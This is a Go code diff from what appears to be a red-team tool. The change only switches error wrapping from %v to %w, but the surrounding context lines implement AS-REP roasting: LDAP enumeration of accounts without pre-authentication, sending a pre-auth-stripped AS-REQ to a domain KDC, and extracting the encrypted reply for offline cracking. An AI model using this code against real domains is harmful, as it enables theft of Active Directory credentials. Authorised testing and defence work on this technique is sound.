@@ -160,21 +160,21 @@ func enumerateAsrepTargets(args asrepArgs, timeout time.Duration) ([]asrepTarget
 	}
 	conn, err := ldapDial(args.Server, args.Port, args.UseTLS, timeout)
 	if err != nil {
-		return nil, fmt.Errorf("LDAP connect: %v", err)
+		return nil, fmt.Errorf("LDAP connect: %w", err)
 	}
 	defer conn.Close()
 
 	conn.SetTimeout(timeout)
 
 	if err := conn.Bind(args.Username, args.Password); err != nil {
-		return nil, fmt.Errorf("LDAP bind: %v", err)
+		return nil, fmt.Errorf("LDAP bind: %w", err)
 	}
 
 	baseDN := args.BaseDN
 	if baseDN == "" {
 		baseDN, err = detectBaseDN(conn)
 		if err != nil {
-			return nil, fmt.Errorf("base DN detection: %v", err)
+			return nil, fmt.Errorf("base DN detection: %w", err)
 		}
 	}
 
@@ -192,7 +192,7 @@ func enumerateAsrepTargets(args asrepArgs, timeout time.Duration) ([]asrepTarget
 
 	result, err := conn.SearchWithPaging(searchReq, 100)
 	if err != nil {
-		return nil, fmt.Errorf("AS-REP target search: %v", err)
+		return nil, fmt.Errorf("AS-REP target search: %w", err)
 	}
 
 	var targets []asrepTarget
@@ -215,7 +215,7 @@ func requestAsrep(cfg *config.Config, realm, kdc, username string) (string, stri
 
 	asReq, err := messages.NewASReqForTGT(realm, cfg, cname)
 	if err != nil {
-		return "", "", fmt.Errorf("AS-REQ creation: %v", err)
+		return "", "", fmt.Errorf("AS-REQ creation: %w", err)
 	}
 
 	// Clear pre-authentication data — this is the key to AS-REP roasting
@@ -224,34 +224,34 @@ func requestAsrep(cfg *config.Config, realm, kdc, username string) (string, stri
 	// Marshal the AS-REQ
 	reqBytes, err := asReq.Marshal()
 	if err != nil {
-		return "", "", fmt.Errorf("AS-REQ marshal: %v", err)
+		return "", "", fmt.Errorf("AS-REQ marshal: %w", err)
 	}
 
 	// Send via TCP to KDC port 88 (RFC 4120 7.2.2: 4-byte length prefix)
 	perReqTimeout := 10 * time.Second
 	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:88", kdc), perReqTimeout)
 	if err != nil {
-		return "", "", fmt.Errorf("KDC connect: %v", err)
+		return "", "", fmt.Errorf("KDC connect: %w", err)
 	}
 	defer conn.Close()
 
 	if err := conn.SetDeadline(time.Now().Add(perReqTimeout)); err != nil {
-		return "", "", fmt.Errorf("set deadline: %v", err)
+		return "", "", fmt.Errorf("set deadline: %w", err)
 	}
 
 	// Write length-prefixed message
 	lenBuf := make([]byte, 4)
 	binary.BigEndian.PutUint32(lenBuf, uint32(len(reqBytes)))
 	if _, err := conn.Write(lenBuf); err != nil {
-		return "", "", fmt.Errorf("send length: %v", err)
+		return "", "", fmt.Errorf("send length: %w", err)
 	}
 	if _, err := conn.Write(reqBytes); err != nil {
-		return "", "", fmt.Errorf("send AS-REQ: %v", err)
+		return "", "", fmt.Errorf("send AS-REQ: %w", err)
 	}
 
 	// Read response length
 	if _, err := readFull(conn, lenBuf); err != nil {
-		return "", "", fmt.Errorf("read response length: %v", err)
+		return "", "", fmt.Errorf("read response length: %w", err)
 	}
 	respLen := binary.BigEndian.Uint32(lenBuf)
 	if respLen > 1<<20 { // 1MB sanity check
@@ -261,7 +261,7 @@ func requestAsrep(cfg *config.Config, realm, kdc, username string) (string, stri
 	// Read response body
 	respBytes := make([]byte, respLen)
 	if _, err := readFull(conn, respBytes); err != nil {
-		return "", "", fmt.Errorf("read response: %v", err)
+		return "", "", fmt.Errorf("read response: %w", err)
 	}
 	defer structs.ZeroBytes(respBytes)
 
@@ -269,7 +269,7 @@ func requestAsrep(cfg *config.Config, realm, kdc, username string) (string, stri
 	var asRep messages.ASRep
 	if err := asRep.Unmarshal(respBytes); err != nil {
 		// Might be a KRBError — account requires pre-auth or doesn't exist
-		return "", "", fmt.Errorf("AS-REP unmarshal failed (account may require pre-auth): %v", err)
+		return "", "", fmt.Errorf("AS-REP unmarshal failed (account may require pre-auth): %w", err)
 	}
 
 	// Extract the encrypted part — this is what we crack offline
